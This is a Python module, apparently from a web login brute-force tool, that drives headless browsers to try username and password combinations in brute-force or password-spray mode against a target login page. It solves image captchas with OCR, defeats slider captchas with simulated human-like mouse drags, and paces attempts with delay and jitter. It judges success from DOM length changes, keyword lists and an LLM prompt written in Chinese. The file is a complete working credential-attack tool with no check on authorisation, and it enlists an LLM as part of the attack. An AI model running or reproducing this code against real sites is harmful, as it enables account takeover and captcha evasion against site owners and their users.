# -*- coding: utf-8 -*-
"""
Attacker module for executing brute force attacks
"""
import asyncio
import time
from typing import Dict, List, Optional, TYPE_CHECKING
from urllib.parse import urlparse
from datetime import datetime

from playwright.async_api import Page

from app.core.browser_pool import BrowserPool
from app.database.models import TestResult
from app.captcha.ocr_solver import OCRSolver

if TYPE_CHECKING:
    from app.core.task_manager import TaskManager


class Attacker:
    """
    爆破执行器

    Executes brute force attacks:
    - Iterates through credential combinations
    - Handles captcha with OCR
    - Detects login success via DOM length
    - Confirms with AI for ambiguous cases
    """

    def __init__(
        self,
        browser_pool: BrowserPool,
        captcha_solver: OCRSolver,
        llm_client,
        task_manager: "TaskManager"
    ):
        """
        Initialize attacker

        Args:
            browser_pool: Browser pool instance
            captcha_solver: Captcha solver instance
            llm_client: LLM client for AI confirmation
            task_manager: Task manager instance
        """
        self.browser_pool = browser_pool
        self.captcha_solver = captcha_solver
        self.llm_client = llm_client
        self.task_manager = task_manager

    async def execute(
        self,
        task_id: str,
        url: str,
        usernames: List[str],
        passwords: List[str],
        analysis: Dict,
        options: Dict
    ) -> Dict:
        """
        Execute brute force attack

        Args:
            task_id: Task ID
            url: Target URL
            usernames: List of usernames
            passwords: List of passwords
            analysis: Page analysis result
            options: Attack options

        Returns:
            Result dict with counts and found credentials
        """
        domain = urlparse(url).netloc
        self.task_manager._push_log(task_id, f"Starting attack on {url}")
        self.task_manager._push_log(task_id, f"Domain: {domain}")
        self.task_manager._push_log(task_id, f"Usernames: {usernames}")
        self.task_manager._push_log(task_id, f"Passwords: {passwords}")

        # Get attack options
        mode = options.get('mode', 'bruteforce')
        delay = options.get('delay', 0)
        jitter = options.get('jitter', 0)
        success_exit = options.get('success_exit', False) or options.get('stop_on_success', False)
        concurrency = max(1, min(options.get('threads', 3), 10))
        self.task_manager._push_log(task_id, f"Mode: {mode}, delay: {delay}ms, concurrency: {concurrency}")

        # Generate credential combinations
        if mode == 'passwordspray':
            combinations = [(u, p) for p in passwords for u in usernames]
        else:
            combinations = [(u, p) for u in usernames for p in passwords]
        # load combinations
        total = len(combinations)
        self.task_manager._push_log(task_id, f"Total combinations: {total}")

        failed_dom_length = analysis.get('failed_dom_length')
        has_captcha = analysis.get('has_captcha', False)
        captcha_type = analysis.get('captcha_type')
        self.task_manager._push_log(task_id, f"Failed DOM length: {failed_dom_length}, has_captcha: {has_captcha}")

        selectors = {
            'username_selector': analysis.get('username_selector'),
            'password_selector': analysis.get('password_selector'),
            'submit_selector': analysis.get('submit_selector'),
            'captcha_selector': analysis.get('captcha_selector'),
            'captcha_input_selector': analysis.get('captcha_input_selector')
        }
        self.task_manager._push_log(task_id, f"Selectors: username={selectors['username_selector']}, password={selectors['password_selector']}, submit={selectors['submit_selector']}")

        # Shared state for concurrent workers
        queue = asyncio.Queue()
        for combo in combinations:
            await queue.put(combo)

        current_counter = {'value': 0}
        success_count = 0
        credentials_found = []
        stop_flag = False  # Local stop flag for success_exit

        # Adjust concurrency to not exceed total
        actual_concurrency = min(concurrency, total)
        self.task_manager._push_log(task_id, f"Launching {actual_concurrency} concurrent browser pages...")

        # ---------- Worker coroutine ----------
        async def worker(worker_id: int):
            nonlocal success_count, stop_flag
            page = None
            try:
                page = await self.browser_pool.create_page(domain)
                self.task_manager._push_log(task_id, f"[W{worker_id}] Browser page ready")

                while not queue.empty():
                    # Check stop flags
                    if self.task_manager.stop_flag or stop_flag:
                        break

                    try:
                        username, password = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break

                    current_counter['value'] += 1
                    idx = current_counter['value']
                    self.task_manager._push_log(task_id, f"[W{worker_id}] Attempt {idx}/{total}: {username}:{password}")

                    self.task_manager._push_progress(
                        task_id, idx, total, username, password
                    )

                    # Navigate to login page
                    try:
                        await page.goto(url, wait_until='networkidle', timeout=30000)
                    except Exception as e:
                        self.task_manager._push_log(task_id, f"[W{worker_id}] Failed to load page: {e}", "error")
                        continue

                    # Try login
                    result = await self._try_login(
                        page=page, url=url,
                        username=username, password=password,
                        selectors=selectors,
                        has_captcha=has_captcha, captcha_type=captcha_type
                    )

                    # --- DOM + keyword + LLM detection ---
                    current_dom = result['dom_length'] or 0
                    dom_diff = abs(current_dom - (failed_dom_length or 0)) if current_dom and failed_dom_length else 0

                    if dom_diff > 0:
                        page_text_content = ''
                        failure_keywords_found = []
                        success_keywords_found = []

                        try:
                            page_text = await page.inner_text('body')
                            page_text_content = page_text
                            page_text_lower = page_text.lower()

                            failure_keywords = [
                                '用户名或密码错误', '密码错误', '用户名错误', '登录失败',
                                '账号或密码错误', '账户或密码错误', '验证失败', '认证失败',
                                '密码不正确', '用户名不存在', '账户不存在', '用户不存在',
                                '请输入正确的', '输入有误', '登录信息有误',
                                'incorrect username', 'incorrect password', 'wrong password',
                                'invalid username', 'invalid password', 'invalid credentials',
                                'login failed', 'authentication failed', 'auth failed',
                                'user not found', 'account not found', 'wrong credentials',
                                'invalid login', 'access denied',
                            ]
                            for kw in failure_keywords:
                                if kw in page_text_lower:
                                    failure_keywords_found.append(kw)

                            success_keywords = [
                                '登录成功', '成功登录', '欢迎您', '您好,', '欢迎回来',
                                'successfully logged in', 'login successful', 'welcome back',
                                '个人中心', '用户中心', '我的账户', '账户信息', '个人设置',
                                'my account', 'user profile', 'account settings',
                                '后台管理', '系统管理', '控制台', '仪表盘',
                                'admin panel', 'management console', 'dashboard',
                            ]
                            for kw in success_keywords:
                                if kw in page_text_lower:
                                    success_keywords_found.append(kw)
                        except Exception:
                            pass

                        has_failure = len(failure_keywords_found) > 0
                        has_success = len(success_keywords_found) > 0

                        self.task_manager._push_log(task_id,
                            f"[W{worker_id}] DOM差异={dom_diff}, 失败词={failure_keywords_found}, 成功词={success_keywords_found}")

                        if has_failure and not has_success:
                            result['success'] = False
                        elif has_success and not has_failure:
                            result['success'] = True
                        else:
                            # 关键词不明确 → 调用LLM
                            if self.llm_client:
                                try:
                                    page_info = {
                                        'current_url': page.url,
                                        'original_url': url,
                                        'page_title': await page.title() if page else '',
                                        'page_text': page_text_content,
                                        'dom_diff': dom_diff,
                                        'failure_keywords': failure_keywords_found,
                                        'success_keywords': success_keywords_found,
                                    }
                                    result['success'] = await self._ai_confirm(page, url, page_info)
                                    self.task_manager._push_log(task_id, f"[W{worker_id}] LLM判定: {'成功' if result['success'] else '失败'}")
                                except Exception:
                                    result['success'] = not has_failure
                            else:
                                result['success'] = not has_failure
                    else:
                        result['success'] = False

                    # Log result
                    status = "成功" if result['success'] else "失败"
                    self.task_manager._push_log(task_id, f"[W{worker_id}] {username}:{password} → {status} (DOM差异={dom_diff})")

                    # Save result
                    await self._save_result(task_id, url, username, password, result)

                    if result['success']:
                        success_count += 1
                        credentials_found.append({'username': username, 'password': password})
                        self.task_manager._push_event(task_id, 'credential_found', {
                            'username': username, 'password': password, 'url': url
                        })
                        self.task_manager._push_log(task_id,
                            f"[W{worker_id}] ★ 发现弱口令: {username}:{password}", "success")
                        if success_exit:
                            stop_flag = True
                            break

                    # Apply delay
                    if delay > 0:
                        import random
                        actual_delay = delay / 1000.0
                        if jitter > 0:
                            actual_delay += random.uniform(0, jitter / 1000.0)
                        await asyncio.sleep(actual_delay)

            except Exception as e:
                self.task_manager._push_log(task_id, f"[W{worker_id}] Worker error: {e}", "error")
                import traceback
                traceback.print_exc()
            finally:
                if page:
                    await self.browser_pool.release_page(page)

        # ---------- Launch workers ----------
        try:
            workers = [asyncio.create_task(worker(i)) for i in range(actual_concurrency)]
            await asyncio.gather(*workers)
        except Exception as e:
            self.task_manager._push_log(task_id, f"Attack error: {e}", "error")
            raise

        self.task_manager._push_log(task_id, f"Attack completed: {success_count}/{total} successes")
        return {
            'total': total,
            'success_count': success_count,
            'failed_count': total - success_count,
            'credentials_found': credentials_found
        }

    async def _try_login(
        self,
        page: Page,
        url: str,
        username: str,
        password: str,
        selectors: Dict,
        has_captcha: bool,
        captcha_type: str
    ) -> Dict:
        """
        Attempt login with given credentials

        Args:
            page: Playwright page
            url: Target URL
            username: Username
            password: Password
            selectors: Selectors dict
            has_captcha: Whether page has captcha
            captcha_type: Type of captcha

        Returns:
            Result dict with success status and metadata
        """
        result = {
            'success': False,
            'dom_length': None,
            'response_time_ms': None,
            'captcha_solved': None,
            'error_message': None
        }

        start_time = time.time()

        try:
            # Fill username
            await page.fill(selectors['username_selector'], username)

            # Fill password
            await page.fill(selectors['password_selector'], password)

            # Handle captcha
            if has_captcha:
                if captcha_type == 'image':
                    captcha_solved = await self._solve_captcha(page, selectors)
                    result['captcha_solved'] = captcha_solved
                elif captcha_type == 'slider':
                    captcha_solved = await self._solve_slider_captcha(page, selectors)
                    result['captcha_solved'] = captcha_solved
                elif captcha_type in ['recaptcha', 'hcaptcha']:
                    # These captchas require manual intervention or external services
                    result['captcha_solved'] = False
                    result['error_message'] = f'{captcha_type} captcha not supported'

            # Submit form
            try:
                await page.click(selectors['submit_selector'], timeout=5000)
            except Exception as e:
                result['error_message'] = f"Submit failed: {e}"

            # Wait for response
            try:
                await page.wait_for_load_state('networkidle', timeout=15000)
            except Exception:
                pass  # Continue even if timeout

            # Get DOM length
            html = await page.content()
            result['dom_length'] = len(html)

            # Calculate response time
            result['response_time_ms'] = int((time.time() - start_time) * 1000)

        except Exception as e:
            result['error_message'] = str(e)

        return result

    async def _solve_captcha(self, page: Page, selectors: Dict) -> bool:
        """
        Solve image captcha

        Args:
            page: Playwright page
            selectors: Selectors dict

        Returns:
            True if captcha was solved
        """
        captcha_sel = selectors.get('captcha_selector')
        input_sel = selectors.get('captcha_input_selector')

        if not captcha_sel or not input_sel:
            return False

        try:
            # Get captcha text using OCR
            captcha_text = await self.captcha_solver.solve_from_element(page, captcha_sel)

            if captcha_text:
                await page.fill(input_sel, captcha_text)
                return True

        except Exception as e:
            print(f"Captcha solving failed: {e}")

        return False

    async def _solve_slider_captcha(self, page: Page, selectors: Dict) -> bool:
        """
        Solve slider captcha by simulating drag

        Args:
            page: Playwright page
            selectors: Selectors dict

        Returns:
            True if slider was solved successfully
        """
        try:
            # Extended slider button selectors
            slider_btn_selectors = [
                '.slider-btn',
                '.slider-button',
                '.slide-verify-slider-mask-item',
                '[class*="slider"] button',
                '[class*="slider-btn"]',
                '.drag-btn',
                '.handler',
                '.slider-handle',
                '.slide-block',
                '.slider-track-btn',
                '.nc_iconfont.btn_slide',
                '.slidetounlock',
                '.slideunlock-slider',
                '#nc_1__scale_span',
                '.btn_slide',
            ]

            slider_element = None
            for sel in slider_btn_selectors:
                try:
                    element = await page.query_selector(sel)
                    if element:
                        is_visible = await element.is_visible()
                        if is_visible:
                            slider_element = element
                            break
                except Exception:
                    continue

            if not slider_element:
                # Try to find by checking all elements with slider-related classes
                try:
                    elements = await page.query_selector_all('[class*="slider"], [class*="slide"], [class*="drag"]')
                    for el in elements:
                        tag = await el.evaluate('el => el.tagName.toLowerCase()')
                        is_visible = await el.is_visible()
                        if is_visible and tag in ['div', 'span', 'button', 'a']:
                            slider_element = el
                            break
                except Exception:
                    pass

            if not slider_element:
                slider_element = await page.query_selector('[draggable="true"]')

            if slider_element:
                # Get slider bounding box
                box = await slider_element.bounding_box()
                if not box:
                    return False

                # Try to find slider track to determine drag distance
                track_width = 280  # Default
                track_selectors = [
                    '.slider-track',
                    '.slide-verify-slider',
                    '[class*="slider-track"]',
                    '[class*="slider-container"]',
                    '.slider',
                ]

                for track_sel in track_selectors:
                    try:
                        track = await page.query_selector(track_sel)
                        if track:
                            track_box = await track.bounding_box()
                            if track_box:
                                track_width = int(track_box['width'] - box['width'])
                                break
                    except Exception:
                        continue

                # Calculate start position
                start_x = box['x'] + box['width'] / 2
                start_y = box['y'] + box['height'] / 2

                # Simulate mouse movement and drag
                await page.mouse.move(start_x, start_y)
                await asyncio.sleep(0.1)
                await page.mouse.down()
                await asyncio.sleep(0.1)

                # Drag with human-like movement
                import random

                steps = random.randint(15, 25)
                for i in range(steps):
                    progress = i / steps
                    eased_progress = progress * progress * (3 - 2 * progress)

                    step_x = start_x + (track_width * eased_progress)
                    step_y = start_y + random.uniform(-3, 3)
                    await page.mouse.move(step_x, step_y)
                    await asyncio.sleep(random.uniform(0.01, 0.05))

                final_x = start_x + track_width - 10
                await page.mouse.move(final_x, start_y)
                await asyncio.sleep(0.1)
                await page.mouse.up()

                # Wait for verification
                await asyncio.sleep(1.5)

                # Check if slider is still visible
                try:
                    is_visible = await slider_element.is_visible()
                    if not is_visible:
                        return True

                    # Check for success indicators
                    page_content = await page.content()
                    success_indicators = ['验证成功', 'success', 'verify-success', 'slider-success']
                    for indicator in success_indicators:
                        if indicator.lower() in page_content.lower():
                            return True

                    return False

                except Exception:
                    return False

            return False

        except Exception as e:
            print(f"Slider captcha solving failed: {e}")
            return False

    async def _ai_confirm(self, page: Page, original_url: str = None, context_data: Dict = None) -> bool:
        """
        AI confirmation of login success

        Args:
            page: Playwright page
            original_url: Original login URL (to detect redirects)
            context_data: Additional context data for AI analysis

        Returns:
            True if login appears successful
        """
        if not self.llm_client:
            return False

        try:
            # Gather comprehensive page information
            indicators = {}

            # 1. Current URL and redirect info
            current_url = page.url
            indicators['current_url'] = current_url
            indicators['original_url'] = original_url
            indicators['url_changed'] = original_url and current_url != original_url

            # Check if URL contains login-related keywords
            url_login_keywords = ['login', 'signin', 'auth', 'authenticate']
            indicators['url_has_login_keyword'] = any(kw in current_url.lower() for kw in url_login_keywords)

            # 2. Page title
            try:
                title = await page.title()
                indicators['page_title'] = title
                title_lower = title.lower() if title else ''

                # Check title for login/success keywords
                login_title_keywords = ['登录', 'login', 'signin', 'sign in']
                success_title_keywords = ['主页', '首页', '个人中心', '用户中心', '后台', '管理',
                                         'home', 'dashboard', 'profile', 'welcome']

                indicators['title_has_login_keyword'] = any(kw in title_lower for kw in login_title_keywords)
                indicators['title_has_success_keyword'] = any(kw in title_lower for kw in success_title_keywords)
            except Exception:
                pass

            # 3. Visible text content
            try:
                visible_text = await page.inner_text('body')
                indicators['page_text'] = visible_text[:2000]

                # Also get text length for context
                indicators['page_text_length'] = len(visible_text)
            except Exception:
                pass

            # 4. Check for login form elements
            try:
                password_input = await page.query_selector('input[type="password"]')
                username_input = await page.query_selector('input[type="text"], input[type="email"]')

                indicators['has_password_field'] = password_input is not None
                indicators['has_username_field'] = username_input is not None
                indicators['has_login_form'] = (password_input is not None and username_input is not None)

                # Check if login button exists
                submit_buttons = await page.query_selector_all('button[type="submit"], input[type="submit"], [class*="login"], [class*="submit"]')
                indicators['has_submit_button'] = len(submit_buttons) > 0
            except Exception:
                pass

            # 5. Check for error message elements
            try:
                error_selectors = [
                    '[class*="error"]', '[class*="alert"]', '[class*="warning"]',
                    '[class*="fail"]', '[class*="wrong"]', '[id*="error"]',
                    '.error-message', '.alert-danger', '.msg-error'
                ]
                error_elements = []
                for sel in error_selectors:
                    elements = await page.query_selector_all(sel)
                    for el in elements:
                        try:
                            if await el.is_visible():
                                text = await el.inner_text()
                                if text:
                                    error_elements.append(text)
                        except Exception:
                            pass

                indicators['visible_error_messages'] = error_elements[:5]  # Limit to first 5
            except Exception:
                pass

            # 6. Check for user-related elements
            try:
                user_element_selectors = [
                    '[class*="user-info"]', '[class*="user-name"]', '[class*="user-avatar"]',
                    '[class*="profile"]', '[class*="account"]',
                    '[id*="user"]', '[id*="profile"]',
                    'a[href*="logout"]', 'a[href*="signout"]', '.logout'
                ]

                user_elements_found = []
                for sel in user_element_selectors:
                    elements = await page.query_selector_all(sel)
                    for el in elements:
                        try:
                            if await el.is_visible():
                                user_elements_found.append(sel)
                                break
                        except Exception:
                            pass

                indicators['user_elements'] = user_elements_found[:5]
                indicators['has_user_elements'] = len(user_elements_found) > 0
            except Exception:
                pass

            # 7. Check for navigation/menu elements (common in post-login pages)
            try:
                nav_selectors = ['nav', 'nav[class*="menu"]', 'nav[class*="sidebar"]',
                                '.sidebar', '.menu', '.navbar']
                nav_found = []
                for sel in nav_selectors:
                    elements = await page.query_selector_all(sel)
                    if elements:
                        nav_found.append(sel)

                indicators['navigation_elements'] = nav_found
            except Exception:
                pass

            # 8. Get DOM structure summary
            try:
                dom_content = await page.content()
                indicators['dom_length'] = len(dom_content)

                # Count specific element types
                links = await page.query_selector_all('a')
                buttons = await page.query_selector_all('button')
                inputs = await page.query_selector_all('input')

                indicators['link_count'] = len(links)
                indicators['button_count'] = len(buttons)
                indicators['input_count'] = len(inputs)
            except Exception:
                pass

            # Merge with provided context data
            if context_data:
                indicators.update(context_data)

            # Build comprehensive prompt for LLM
            prompt = f"""你是一个登录状态判断专家。请分析以下页面信息，判断用户是否已经成功登录。

## 页面信息

### URL分析
- 原始登录URL: {indicators.get('original_url', '未知')}
- 当前URL: {indicators.get('current_url', '未知')}
- URL是否发生变化: {'是' if indicators.get('url_changed') else '否'}
- 当前URL是否包含login关键词: {'是' if indicators.get('url_has_login_keyword') else '否'}

### 页面标题分析
- 页面标题: {indicators.get('page_title', '未知')}
- 标题是否包含登录关键词: {'是' if indicators.get('title_has_login_keyword') else '否'}
- 标题是否包含成功关键词: {'是' if indicators.get('title_has_success_keyword') else '否'}

### 登录表单分析
- 是否存在密码输入框: {'是' if indicators.get('has_password_field') else '否'}
- 是否存在用户名输入框: {'是' if indicators.get('has_username_field') else '否'}
- 是否存在完整登录表单: {'是' if indicators.get('has_login_form') else '否'}
- 是否存在提交按钮: {'是' if indicators.get('has_submit_button') else '否'}

### 错误信息检测
- 可见的错误消息: {indicators.get('visible_error_messages', [])}
- 检测到的失败关键词: {indicators.get('failure_keywords', [])}

### 成功指标检测
- 检测到的成功关键词: {indicators.get('success_keywords', [])}
- 用户相关元素: {indicators.get('user_elements', [])}
- 是否存在用户元素: {'是' if indicators.get('has_user_elements') else '否'}
- 导航元素: {indicators.get('navigation_elements', [])}

### DOM结构分析
- DOM长度: {indicators.get('dom_length', '未知')} 字符
- 链接数量: {indicators.get('link_count', '未知')}
- 按钮数量: {indicators.get('button_count', '未知')}
- 输入框数量: {indicators.get('input_count', '未知')}
- DOM变化量: {indicators.get('dom_diff', '未知')} 字符

### 页面文本内容（前1500字符）
{indicators.get('page_text', '无法获取')[:1500]}

---

## 判断规则

1. **失败关键词优先原则**：如果存在明确的失败关键词（如"用户名或密码错误"、"登录失败"等），优先判定为失败
2. **登录表单检测**：如果登录表单（密码输入框）仍然存在，很可能尚未登录成功
3. **URL变化**：如果URL已经离开登录页面（不再包含login关键词），可能登录成功
4. **用户元素**：如果出现用户头像、用户名、退出登录按钮等元素，表示登录成功
5. **页面内容**：如果出现"欢迎"、"登录成功"、"个人中心"等关键词，表示登录成功

请根据以上信息判断：
- 如果判定为**登录成功**，返回：`success`
- 如果判定为**登录失败**，返回：`failed`
- 如果无法确定，返回：`unknown`

只返回 success、failed 或 unknown 中的一个词，不要其他解释。"""

            # Ask LLM
            response = self.llm_client.chat(
                messages=[{'role': 'user', 'content': prompt}],
                max_tokens=50,
                temperature=0.1
            )

            if response.success:
                answer = response.content.strip().lower()
                print(f"[AI Confirm] Response: {answer}")

                # Parse response
                if 'success' in answer and 'failed' not in answer:
                    return True
                elif 'failed' in answer or 'fail' in answer:
                    return False
                elif 'unknown' in answer:
                    # Uncertain - conservative: treat as failure
                    return False
                else:
                    # Default to False for safety
                    return False

        except Exception as e:
            print(f"AI confirmation failed: {e}")
            import traceback
            traceback.print_exc()

        # Conservative default - return False if AI fails
        return False

    async def _save_result(
        self,
        task_id: str,
        url: str,
        username: str,
        password: str,
        result: Dict
    ):
        """
        Save test result to database

        Args:
            task_id: Task ID
            url: Target URL
            username: Username
            password: Password
            result: Result dict
        """
        TestResult.create(
            task_id=task_id,
            url=url,
            username=username,
            password=password,
            success=result['success'],
            dom_length=result['dom_length'],
            response_time_ms=result['response_time_ms'],
            captcha_solved=result['captcha_solved'],
            error_message=result['error_message']
        )